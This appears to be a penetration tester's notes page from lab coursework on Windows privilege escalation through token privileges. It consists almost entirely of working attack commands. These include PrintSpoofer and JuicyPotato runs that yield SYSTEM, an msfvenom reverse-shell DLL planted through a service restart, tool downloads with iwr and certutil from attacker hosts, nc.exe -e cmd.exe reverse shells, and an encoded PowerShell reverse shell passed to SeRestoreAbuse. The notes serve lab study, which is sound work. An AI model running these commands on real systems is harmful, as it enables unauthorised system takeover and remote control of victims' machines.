# Token Impersonation

```
whoami /priv
```



Doing further research on token impersonation vulnerabilities, you will see a number of different exploits exist. These have whimsical names such as Hot Potato, Rotten Potato, Lonely Potato, Juicy Potato, etc. You will be able to decide on which "Potato" better suits your need depending on the version of the target system. While some of these exploits will run on the target system, others may require you to set up a fake server on the same network.



{% hint style="info" %}
Other privileges that may lead to privilege escalation are _SeBackupPrivilege_, _SeAssignPrimaryToken_, _SeLoadDriver_, and _SeDebug_. In this section, we'll closely inspect privilege escalation vectors in the context of _SeImpersonatePrivilege_.
{% endhint %}

## PWK2024&#x20;

## SeImpersonatePrivilege

{% code title="" overflow="wrap" lineNumbers="true" %}
```
kali@kali:~$ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe 
...
2022-07-07 03:48:45 (16.6 MB/s) - ‘PrintSpoofer64.exe’ saved [27136/27136]

kali@kali:~$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
{% endcode %}

{% code title="" overflow="wrap" lineNumbers="true" %}
```
C:\Users\dave> powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\dave> iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
```
{% endcode %}

{% code title="" overflow="wrap" lineNumbers="true" %}
```
PS C:\Users\dave> .\PrintSpoofer64.exe -i -c powershell.exe
.\PrintSpoofer64.exe -i -c powershell.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
nt authority\system
```
{% endcode %}

## Capstone exercise 16.3.2 Q2

{% code title="Created payload to be copied on the victim" overflow="wrap" lineNumbers="true" %}
```
msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.45.218 lport=5555 -f dll > EnterpriseServiceOptional.dll
 
```
{% endcode %}

{% code title="Download and restart service" overflow="wrap" lineNumbers="true" %}
```
PS C:\Services> iwr -uri http://192.168.45.218/EnterpriseServiceOptional.dll -Outfile EnterpriseServiceOptional.dll     
PS C:\Services> Restart-Service EnterpriseService                                                                       PS C:\Services>     
```
{% endcode %}

### SeBackupPrivilege

Used the steps from here to copy files and enable SeBackupPrivilege to copy flag.txt

{% code title="Enable SeBackupPrivilege and copy flag.txt" overflow="wrap" lineNumbers="true" %}
```
iwr -uri http://192.168.45.218/SeBackupPrivilegeUtils.dll -Outfile SeBackupPrivilegeUtils.dll
iwr -uri http://192.168.45.218/SeBackupPrivilegeCmdLets.dll -Outfile SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege
Get-SeBackupPrivilege
Copy-FileSeBackupPrivilege c:\users\enterpriseadmin\Desktop\flag.txt c:\users\enterpriseuser\flag.txt
```
{% endcode %}

## Old

We will need to check the list of [CLSID](http://ohpe.it/juicy-potato/CLSID/) to use the exploit.



**Exploit and CLSID list**:

```
https://github.com/ohpe/juicy-potato
```

{% code overflow="wrap" %}
```
certutil.exe -urlcache -f http://10.10.XX.XX/JuicyPotato.exe C:\Temp\JuicyPotato.exe
certutil.exe -urlcache -f http://10.10.XX.XX/nc.exe C:\Temp\nc.exe
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\inetpub\drupal-7.54\nc.exe -e cmd.exe 10.10.XX.XX 555" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}

or without a CLSID
 .\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\Users\merlin\Desktop\nc.exe -e cmd.exe 10.10.16.22 5555" -t * 
```
{% endcode %}

## SeRestorePrivilege

check this walk-through here [https://www.youtube.com/watch?v=1nRzABu6eKU](https://www.youtube.com/watch?v=1nRzABu6eKU) and use this tool [https://github.com/xct/SeRestoreAbuse](https://github.com/xct/SeRestoreAbuse)&#x20;

Encode PS reverse oneliner to UTF-16LE + base64

```
.\SeRestoreAbuse.exe "cmd /c powershell -exec bypass -enc <base64 encoded reverse shell here>"
```

